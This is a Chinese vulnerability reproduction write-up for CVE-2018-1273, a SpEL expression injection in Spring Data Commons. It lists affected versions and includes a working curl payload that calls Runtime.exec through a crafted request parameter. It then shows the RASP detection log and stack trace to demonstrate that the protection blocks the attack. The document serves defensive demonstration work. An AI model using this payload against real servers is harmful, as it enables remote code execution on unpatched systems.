# CVE-2018-1273

## 漏洞简介

Spring Data Commons（1.13至1.13.10之前的版本，2.0至2.0.5的版本以及较旧的不受支持的版本）包含由于特殊元素的不正确中和而导致的属性绑定器漏洞。未经身份验证的远程恶意用户（或攻击者）可以针对Spring Data REST支持的HTTP资源提供特制的请求参数，或者使用Spring Data的基于投影的请求有效负载绑定可能导致远程执行代码攻击。总结来说这是一个spel表达式注入漏洞。

## 影响版本

Spring Data Commons 1.13至1.13.10（Ingalls SR10）

Spring Data REST 2.6至2.6.10（Ingalls SR10）

Spring Data Commons 2.0至2.0.5（Kay SR5）

Spring Data REST 3.0至3.0.5（Kay SR5）

## 复现环境
### 启动
[web工程代码](https://gitee.com/xl1605368195/poc-cve-2018-1273)

启动工程：`mvn spring-boot:run`

### 发起攻击请求

执行命令:
touch /tmp/spring.txt

```shell
curl -X POST http://localhost:8080/account -d "name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('touch /tmp/spring.txt')]=test"
```
spring.txt 在/tmp下创建成功

## RASP防护

### 开启RASP,再次触发攻击请求
```json
{
    "protocol":"HTTP/1.1",
    "tomcat.request.body.time":0.016596,
    "method":"POST",
    "remoteHost":"0:0:0:0:0:0:0:1",
    "cmdArray":[
        "touch",
        "/tmp/spring.txt"
    ],
    "requestURI":"/account",
    "stackTrace":[
        "java.lang.ProcessImpl.start(ProcessImpl.java)",
        "java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)",
        "java.lang.Runtime.exec(Runtime.java:621)",
        "java.lang.Runtime.exec(Runtime.java:451)",
        "java.lang.Runtime.exec(Runtime.java:348)",
        "sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)",
        "sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)",
        "sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)",
        "java.lang.reflect.Method.invoke(Method.java:498)",
        "org.springframework.expression.spel.support.ReflectiveMethodExecutor.execute(ReflectiveMethodExecutor.java:117)",
        "org.springframework.expression.spel.ast.MethodReference.getValueInternal(MethodReference.java:133)",
        "org.springframework.expression.spel.ast.MethodReference.access$000(MethodReference.java:51)",
        "org.springframework.expression.spel.ast.MethodReference$MethodValueRef.getValue(MethodReference.java:372)",
        "org.springframework.expression.spel.ast.CompoundExpression.getValueInternal(CompoundExpression.java:88)",
        "org.springframework.expression.spel.ast.Indexer.getValueRef(Indexer.java:122)",
        "org.springframework.expression.spel.ast.CompoundExpression.getValueRef(CompoundExpression.java:66)",
        "org.springframework.expression.spel.ast.CompoundExpression.setValue(CompoundExpression.java:95)",
        "org.springframework.expression.spel.standard.SpelExpression.setValue(SpelExpression.java:445)",
        "org.springframework.data.web.MapDataBinder$MapPropertyAccessor.setPropertyValue(MapDataBinder.java:187)",
        "org.springframework.beans.AbstractPropertyAccessor.setPropertyValue(AbstractPropertyAccessor.java:65)",
        "org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:95)",
        "org.springframework.validation.DataBinder.applyPropertyValues(DataBinder.java:860)",
        "org.springframework.validation.DataBinder.doBind(DataBinder.java:756)",
        "org.springframework.web.bind.WebDataBinder.doBind(WebDataBinder.java:192)",
        "org.springframework.validation.DataBinder.bind(DataBinder.java:741)",
        "org.springframework.data.web.ProxyingHandlerMethodArgumentResolver.createAttribute(ProxyingHandlerMethodArgumentResolver.java:162)",
        "org.springframework.web.method.annotation.ModelAttributeMethodProcessor.resolveArgument(ModelAttributeMethodProcessor.java:106)",
        "org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:121)",
        "org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:158)",
        "org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:128)",
        "org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97)",
        "org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827)",
        "org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738)",
        "org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85)",
        "org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967)",
        "org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)",
        "org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)",
        "org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:872)"
    ],
    "localAddr":"0:0:0:0:0:0:0:1",
    "parameters":"name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('touch /tmp/spring.txt')]=testt",
    "remoteAddr":"0:0:0:0:0:0:0:1"
}
```
攻击参数、利用链路非常清楚。

### 性能
http parameter 检测耗时： 0.077333 ms

http body 检测耗时： 0.016596 ms

攻击命令检测耗时： 0.697047 ms


